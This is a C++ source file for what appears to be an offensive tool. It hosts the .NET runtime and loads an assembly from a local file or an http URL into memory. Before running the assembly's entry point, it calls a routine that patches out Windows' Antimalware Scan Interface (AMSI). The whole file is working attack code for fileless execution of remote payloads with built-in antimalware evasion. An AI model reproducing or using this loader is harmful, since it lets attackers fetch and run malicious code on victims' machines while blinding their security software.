#include "pch.h"
#include "Bypass.h"
#include "HttpHelper.h"

static char * ReadAllBytes(const char *filename, int* read)
{
	ifstream ifs(filename, ios::binary | ios::ate);
	if (!ifs){
		printf("[-] File not found or file can not open: %s\n",filename);
		exit(-1);
	}
	else
	{
		ifstream::pos_type pos = ifs.tellg();
		int length = pos;
		char *pChars = new char[length];
		ifs.seekg(0, ios::beg);
		ifs.read(pChars, length);
		ifs.close();
		*read = length;
		printf("[+] Read file bytes success.\n");
		return pChars;
	}
}

bool LoadAssembly(char *assemblyBuffer, long buffsize, string args, int argsSize)
{
	bool result = false;
	HRESULT hr;
	ICLRMetaHost* pMetaHost = NULL;
	ICorRuntimeHost* pRuntimeHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	SAFEARRAY* pSafeArray = NULL;
	SAFEARRAY* psaStaticMethodArgs = NULL;
	_AssemblyPtr pAssembly = NULL;
	_MethodInfoPtr pMethodInfo = NULL;
	SAFEARRAYBOUND rgsabound[1];
	void* pvData = NULL;
	Bypass bp;
	VARIANT retVal;
	VARIANT obj;

	printf("[+] Loading Assembly.\n");
	/* Get ICLRMetaHost instance */
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
	if (FAILED(hr))
	{
		PCWSTR pszFlavor = L"wks";
		PCWSTR pszVersion = L"v2.0.50727";
		hr = CorBindToRuntimeEx(pszVersion, pszFlavor, 0, CLSID_CorRuntimeHost, IID_PPV_ARGS(&pRuntimeHost));
		if (FAILED(hr))
		{
			printf("[-] .NET 2.0 load failed\n");
			goto Cleanup;
		}
		printf("[+] Use .NET 2.0 runtime environment.\n");
	}
	else
	{
		hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pRuntimeInfo));
		if (FAILED(hr))
		{
			printf("[-] .NET 4.0 load failed\n");
			goto Cleanup;
		}
		printf("[+] Use .NET 4.0 runtime environment.\n");
		hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
		if (FAILED(hr))
		{
			printf("[-] ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
			goto Cleanup;
		}
	}
	printf("[+] ICLRRuntimeInfo::GetInterface success.\n");

	/* Start the CLR */
	hr = pRuntimeHost->Start();
	if (FAILED(hr))
	{
		printf("[-] CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	printf("[+] Start CLR success.\n");

	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
	if (FAILED(hr))
	{
		printf("[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	printf("[+] ICorRuntimeHost::GetDefaultDomain success.\n");

	/* Equivalent of System.AppDomain.CurrentDomain in C# */
	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
	if (FAILED(hr))
	{
		printf("[-] Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	rgsabound[0].cElements = buffsize;
	rgsabound[0].lLbound = 0;
	pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	hr = SafeArrayAccessData(pSafeArray, &pvData);
	if (FAILED(hr))
	{
		printf("[-] Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	printf("[+] Get Default AppDomain success.\n");

	memcpy(pvData, assemblyBuffer, buffsize);
	hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr))
	{
		printf("[-] Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	int amsiResult = bp.PatchAmsi();
	if (amsiResult == -1)
	{
		printf("[-] Amsi bypass failed\n");
	}


	/* Equivalent of System.AppDomain.CurrentDomain.Load(byte[] rawAssembly) */
	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
	if (FAILED(hr))
	{
		printf("[-] Failed pDefaultAppDomain->Load_3 w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	/* Assembly.EntryPoint Property */
	hr = pAssembly->get_EntryPoint(&pMethodInfo);
	if (FAILED(hr))
	{
		printf("[-] Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	if (args[0] != '\x00')
	{
		VARIANT vtPsa;
		vtPsa.vt = (VT_ARRAY | VT_BSTR);
		//TODO! Change cElement to the number of Main arguments
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
		LPWSTR *szArglist;
		int nArgs;
		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * argsSize + 1));
		mbstowcs(wtext, (char *)args.data(), argsSize + 1);
		szArglist = CommandLineToArgvW(wtext, &nArgs);
		free(wtext);
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
		for (long i = 0; i < nArgs; i++)
		{
			size_t converted;
			size_t strlength = wcslen(szArglist[i]) + 1;
			OLECHAR *sOleText1 = new OLECHAR[strlength];
			char * buffer = (char *)malloc(strlength * sizeof(char));
			wcstombs(buffer, szArglist[i], strlength);
			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
			BSTR strParam1 = SysAllocString(sOleText1);
			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
			free(buffer);
		}
		long iEventCdIdx(0);
		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
		printf("[+] Set parameter success.\n");
	}
	else
	{
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	}
	printf("[+] Invoke Assembly Method...\n\n\n");

	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
	if (FAILED(hr))
	{
		printf("[-] Failed pMethodInfo->Invoke_3  w/hr 0x%08lx\n", hr);
		printf("[!] Prompt:\n");
		printf("    Please note the .net version of the assembly.\n");
		printf("    Does the assembly need to specify parameters ?\n");
		goto Cleanup;
	}
	printf("\n\n\n[+] Success.\n");
	result = true;

Cleanup:
	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}

	return result;
}



int main(int argc, char *argv[])
{
	string args;
	if (argc == 1) 
	{
		printf("[!] Error: Please provide assembly path or url");
		return 0;
	}
	else if(argc == 2)
	{
		string temp = argv[1];
		int lenght = 0;
		char* buffer = NULL;	
		if (temp.find("http://") < temp.length()) 
		{
			HttpHelper webRequest;
			buffer = webRequest.HttpRequest(argv[1], &lenght);
		}
		else
		{
			buffer = ReadAllBytes(argv[1], &lenght);
		}
		LoadAssembly(buffer, lenght, args, args.length());
	}
	else
	{
		for (int i = 2; i < argc; i++)
		{
			string arg = argv[i];
			args.append(arg);
			args.append(" ");
		}

		string temp = argv[1];
		int lenght = 0;
		char* buffer = NULL;
		if (temp.find("http://") < temp.length())
		{
			HttpHelper webRequest;
			buffer = webRequest.HttpRequest(argv[1], &lenght);
		}
		else
		{
			buffer = ReadAllBytes(argv[1], &lenght);
		}
		LoadAssembly(buffer, lenght, args, args.length());
	}
}